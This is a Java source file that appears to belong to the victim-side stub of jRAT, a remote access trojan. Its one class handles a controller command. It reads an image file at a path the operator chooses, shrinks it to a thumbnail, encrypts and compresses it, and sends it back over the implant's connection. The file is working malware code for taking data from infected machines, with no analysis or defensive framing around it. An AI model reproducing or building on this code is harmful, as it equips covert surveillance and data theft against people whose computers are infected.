package su.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import su.jrat.common.compress.GZip;
import su.jrat.common.crypto.Crypto;
import su.jrat.stub.Connection;
import su.jrat.stub.Main;
import su.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;
import su.jrat.stub.utils.ImageUtils;


public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		Connection.addToSendQueue(new Packet59ThumbnailPreview(file));

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = ImageUtils.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
